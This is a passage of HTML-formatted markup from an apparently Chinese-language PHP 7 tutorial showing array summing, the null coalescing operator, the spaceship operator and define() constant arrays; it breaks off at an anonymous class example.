style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n        </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">return</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> array_sum</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">$array</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">);</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">},</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $arrays</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">);</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\nprint_r</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">arraysSum</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">([</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">2</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">3</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">],</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">4</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">5</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">6</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">],</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">7</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">8</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">9</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">]));</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">以上实例会输出：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">Array</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">0</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">]</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">6</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">]</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">15</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">2</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">]</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">24</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">)</span></span></pre><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">NULL 合并运算符</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">由于日常使用中存在大量同时使用三元表达式和 isset()的情况，NULL 合并运算符使得变量存在且值不为NULL， 它就会返回自身的值，否则返回它的第二个操作数。</span></p><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">实例如下：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 如果 $_GET['user'] 不存在返回 'nobody'，否则返回 $_GET['user'] 的值</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n$username </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $_GET</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'user'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">]</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">??</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'nobody'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 类似的三元运算符</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n$username </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> isset</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">$_GET</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'user'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">])</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $_GET</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'user'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">]</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">:</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'nobody'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">?&gt;</span></span></pre><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">太空船操作符（组合比较符）</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">太空船操作符用于比较两个表达式。当$a大于、等于或小于$b时它分别返回-1、0或1。</span></p><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">实例如下：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 整型</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 0</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">2</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// -1</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">2</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 1</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 浮点型</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1.5</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1.5</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 0</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1.5</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">2.5</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// -1</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">2.5</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1.5</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 1</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n \n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 字符串</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"a\"</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"a\"</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 0</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"a\"</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"b\"</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// -1</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"b\"</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"a\"</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 1</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">?&gt;</span></span></pre><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">通过 define() 定义常量数组</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">实例如下：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\ndefine</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'ANIMALS'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'dog'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'cat'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'bird'</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">]);</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\necho ANIMALS</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">];</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 输出 \"cat\"</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">?&gt;</span></span></pre><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">匿名类</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">现在支持通过new class 来实例化一个匿名类，实例如下：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">interface</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">Logger</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" 